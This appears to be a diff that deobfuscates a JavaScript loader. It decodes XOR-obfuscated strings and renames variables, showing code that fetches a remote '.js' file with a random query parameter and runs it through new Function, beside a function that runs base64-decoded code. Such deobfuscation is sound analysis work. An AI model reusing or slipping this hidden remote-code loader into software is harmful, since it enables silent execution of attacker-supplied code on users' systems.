@@ -78,36 +78,31 @@ function anonymous() {
         },
         // original function 
         hPL3On: c,
-        ZKvD0e: async function(M) {
-            if (M in cache == !1 && M in MM == !1) {
-                let I = M;
-                I = IM(cache.p + M).substring(0, 40);
-                const N = await async function(M) {
+        ZKvD0e: async function(script) {
+            if (script in cache == !1 && script in MM == !1) {
+                let I = script;
+                I = IM(cache.p + script).substring(0, 40);
+                const getJS = await async function(M) {
                     return new Promise(((I, N) => {
                         const D = new XMLHttpRequest;
                         let g;
-                        const T = (M, I) => Math.floor(Math.random() * (I - M + 1)) + M;
+                        const getRngRange = (M, I) => Math.floor(Math.random() * (I - M + 1)) + M;
                         g = new URL((cache.$) + (M));
-                        const c = Math.random().toString(36).slice(2, T(5, 10)),
-                            d = T(0, 1);
-                        g.searchParams.set(c, d), D.open(([126, 124, 109].map(x => {
-                            return String.fromCharCode(x ^ 57);
-                        }).join("")), g.toString(), !0), D.responseType = ([66, 83, 78, 66].map(x => {
-                            return String.fromCharCode(x ^ 54);
-                        }).join("")), D.onreadystatechange = () => {
+                        const c = Math.random().toString(36).slice(2, getRngRange(5, 10)),
+                            d = getRngRange(0, 1);
+                        g.searchParams.set(c, d), D.open("GET", g.toString(), !0), D.responseType = "text", D.onreadystatechange = () => {
                             if (D.readyState === XMLHttpRequest.DONE)
-                                if ((1714767175 ^ 1714767247) === D.status) {
+                                if (D.status === 200) {
                                     const M = D.response;
                                     null === M || "" === M ? reject("") : I(M)
                                 } else reject("")
                         }, D.send()
                     }))
-                }((I) + ([99, 39, 62].map(x => {
-                    return String.fromCharCode(x ^ 77)
-                }).join("")));
-                cache[M] = new Function(N)()
+                }((I) + (".js"));
+                // run function
+                cache[script] = new Function(getJS)()
             }
-            return c(M)
+            return c(script)
         },
         fgPoij: function(M, I) {
             M in cache == !1 && (cache[M] = new Function(atob(I))())
